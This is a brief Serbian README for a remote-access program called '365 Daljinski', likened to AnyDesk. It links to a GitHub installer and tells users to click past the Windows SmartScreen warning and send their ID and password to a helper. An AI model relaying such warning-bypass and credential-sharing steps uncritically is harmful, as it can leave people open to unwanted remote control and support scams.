# 365 Daljinski

Program za udaljeni pristup računaru (kao AnyDesk).

## ⬇️ [Preuzmi installer (365-daljinski-setup.exe)](https://github.com/Nikolic28/365-daljinski/releases/latest/download/365-daljinski-setup.exe)

1. Klikni link iznad. Preuzimanje kreće odmah, ne treba nalog.
2. Pokreni `365-daljinski-setup.exe`.
3. Ako Windows prikaže „Windows protected your PC“, klikni **More info** → **Run anyway**.
4. Pošalji svoj **ID** i **lozinku** onome ko ti pomaže.

Program se posle sam ažurira.
